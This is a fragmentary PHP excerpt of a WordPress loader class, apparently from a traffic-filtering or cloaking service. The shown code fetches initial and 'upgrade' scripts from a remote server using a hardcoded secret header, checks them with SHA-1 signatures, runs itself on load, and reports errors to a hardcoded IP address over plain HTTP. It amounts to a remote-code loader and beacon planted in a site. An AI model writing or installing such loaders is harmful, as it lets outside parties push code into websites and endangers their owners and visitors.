...
class FraudFilterWordPressLoader_uh25e {
    public function run() {
    ...
    function isSignatureValidTemp($sign, $time) {
        $str = 'c234eb20-dc01-44d2-8c26-3aefc33495b0.'.$this->getClidTemp().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
    ...
    function getUpgradeScriptViaContentsWP($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: c234eb20-dc01-44d2-8c26-3aefc33495b0',
                'timeout' => 2
            )
        );
    ...
    function downloadScriptFirstTime($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2ValidTemp($output)) {
            ...
            $headers[] = 'x-ff-secret: c234eb20-dc01-44d2-8c26-3aefc33495b0';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: c234eb20-dc01-44d2-8c26-3aefc33495b0';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=uh25e&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterWordPressLoader_uh25e = new FraudFilterWordPressLoader_uh25e();
$fraudFilterWordPressLoader_uh25e->run();
